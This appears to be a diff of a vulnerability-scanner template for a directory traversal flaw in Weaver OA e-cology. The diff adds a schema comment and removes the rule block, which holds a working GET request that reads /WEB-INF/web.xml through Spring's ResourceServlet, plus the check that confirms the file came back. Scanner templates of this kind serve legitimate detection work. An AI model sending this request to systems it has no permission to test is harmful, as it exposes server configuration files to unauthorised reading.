@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: e-cology-springframework-directory-traversal
 
 info:
@@ -7,11 +8,3 @@ info:
   description: 泛微OA e-cology springframework 目录遍历  app="Weaver-OA"
   reference:
     - https://www.weaver.com.cn/cs/securityDownload.asp
-
-rules:
-    r0:
-        request:
-            method: GET
-            path: /weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
-        expression: response.status == 200 && response.body.bcontains(b"<url-pattern>/weaver/")
-expression: r0()
